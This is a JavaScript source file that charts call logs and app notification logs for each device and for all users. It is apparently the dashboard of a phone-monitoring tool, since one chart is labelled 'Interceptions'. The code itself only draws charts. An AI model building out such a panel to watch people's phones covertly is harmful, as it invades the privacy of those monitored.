// Chart Rendering & Data Aggregations (using Chart.js)

// Global reference to prevent canvas reuse crashes
let callPieChart = null;
let appFrequencyChart = null;
let globalActivityChart = null;
let globalTopAppsChart = null;

// 1. User Specific Analytics (Called from user-details.html)
function loadAnalyticsCharts(uid, deviceId) {
    // A. Fetch call logs to analyze types
    db.ref('call_logs').child(uid).child(deviceId).once('value')
        .then(snapshot => {
            let incoming = 0;
            let outgoing = 0;
            let missed = 0;

            snapshot.forEach(child => {
                const call = child.val();
                if (call.type === 'INCOMING') incoming++;
                else if (call.type === 'OUTGOING') outgoing++;
                else if (call.type === 'MISSED') missed++;
            });

            renderCallPieChart(incoming, outgoing, missed);
        });

    // B. Fetch notifications to analyze application frequencies
    db.ref('notification_logs').child(uid).child(deviceId).once('value')
        .then(snapshot => {
            const appCounts = {};
            snapshot.forEach(child => {
                const notif = child.val();
                const name = notif.appName || 'Other';
                appCounts[name] = (appCounts[name] || 0) + 1;
            });

            // Convert to sorted lists
            const sortedApps = Object.keys(appCounts).map(key => ({
                name: key,
                count: appCounts[key]
            })).sort((a, b) => b.count - a.count);

            const labels = sortedApps.slice(0, 5).map(item => item.name);
            const data = sortedApps.slice(0, 5).map(item => item.count);

            renderAppBarChart(labels, data);
        });
}

function renderCallPieChart(inc, out, mis) {
    const ctx = document.getElementById('callPieChart');
    if (!ctx) return;

    if (callPieChart) {
        callPieChart.destroy();
    }

    callPieChart = new Chart(ctx, {
        type: 'pie',
        data: {
            labels: ['Incoming', 'Outgoing', 'Missed'],
            datasets: [{
                data: [inc, out, mis],
                backgroundColor: ['#00e676', '#00e5ff', '#ff1744'],
                borderWidth: 1,
                borderColor: '#1c1e30'
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    position: 'bottom',
                    labels: { color: '#f5f6fa', font: { family: 'Outfit' } }
                }
            }
        }
    });
}

function renderAppBarChart(labels, data) {
    const ctx = document.getElementById('appBarChart');
    if (!ctx) return;

    if (appFrequencyChart) {
        appFrequencyChart.destroy();
    }

    appFrequencyChart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: labels.length > 0 ? labels : ['No Data'],
            datasets: [{
                label: 'Notifications',
                data: data.length > 0 ? data : [0],
                backgroundColor: '#7c4dff',
                borderRadius: 6
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: { ticks: { color: '#8f94b1' }, grid: { display: false } },
                y: { ticks: { color: '#8f94b1' }, grid: { color: 'rgba(255,255,255,0.03)' } }
            },
            plugins: {
                legend: { display: false }
            }
        }
    });
}

// 2. Global Analytics Panel (Called from analytics.html)
function loadGlobalAnalytics() {
    // Collect stats from ALL users
    Promise.all([
        db.ref('call_logs').once('value'),
        db.ref('notification_logs').once('value')
    ]).then(([callsSnapshot, notificationsSnapshot]) => {
        let incoming = 0, outgoing = 0, missed = 0;
        const appCounts = {};

        // Aggregate Calls
        const callsVal = callsSnapshot.val() || {};
        Object.keys(callsVal).forEach(uid => {
            Object.keys(callsVal[uid]).forEach(deviceId => {
                const logs = callsVal[uid][deviceId];
                Object.keys(logs).forEach(logId => {
                    const call = logs[logId];
                    if (call.type === 'INCOMING') incoming++;
                    else if (call.type === 'OUTGOING') outgoing++;
                    else if (call.type === 'MISSED') missed++;
                });
            });
        });

        // Aggregate Apps
        const notifVal = notificationsSnapshot.val() || {};
        Object.keys(notifVal).forEach(uid => {
            Object.keys(notifVal[uid]).forEach(deviceId => {
                const logs = notifVal[uid][deviceId];
                Object.keys(logs).forEach(logId => {
                    const notif = logs[logId];
                    const app = notif.appName || 'Other';
                    appCounts[app] = (appCounts[app] || 0) + 1;
                });
            });
        });

        renderGlobalActivityChart(incoming, outgoing, missed);
        
        // Render top active apps bar chart
        const sortedApps = Object.keys(appCounts).map(key => ({
            name: key,
            count: appCounts[key]
        })).sort((a, b) => b.count - a.count);

        const appLabels = sortedApps.slice(0, 5).map(item => item.name);
        const appData = sortedApps.slice(0, 5).map(item => item.count);
        renderGlobalTopApps(appLabels, appData);
    });
}

function renderGlobalActivityChart(inc, out, mis) {
    const ctx = document.getElementById('globalActivityChart');
    if (!ctx) return;

    if (globalActivityChart) {
        globalActivityChart.destroy();
    }

    globalActivityChart = new Chart(ctx, {
        type: 'doughnut',
        data: {
            labels: ['Incoming Calls', 'Outgoing Calls', 'Missed Calls'],
            datasets: [{
                data: [inc, out, mis],
                backgroundColor: ['#00e676', '#00e5ff', '#ff1744'],
                borderWidth: 1,
                borderColor: '#1c1e30'
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    position: 'bottom',
                    labels: { color: '#f5f6fa', font: { family: 'Outfit' } }
                }
            }
        }
    });
}

function renderGlobalTopApps(labels, data) {
    const ctx = document.getElementById('globalTopAppsChart');
    if (!ctx) return;

    if (globalTopAppsChart) {
        globalTopAppsChart.destroy();
    }

    globalTopAppsChart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: labels.length > 0 ? labels : ['No Data'],
            datasets: [{
                label: 'Interceptions',
                data: data.length > 0 ? data : [0],
                backgroundColor: '#00e5ff',
                borderRadius: 6
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: { ticks: { color: '#8f94b1' }, grid: { display: false } },
                y: { ticks: { color: '#8f94b1' }, grid: { color: 'rgba(255,255,255,0.03)' } }
            },
            plugins: {
                legend: { display: false }
            }
        }
    });
}

// Bind load call if on analytics page
document.addEventListener('DOMContentLoaded', () => {
    if (window.location.pathname.endsWith('analytics.html')) {
        loadGlobalAnalytics();
    }
});
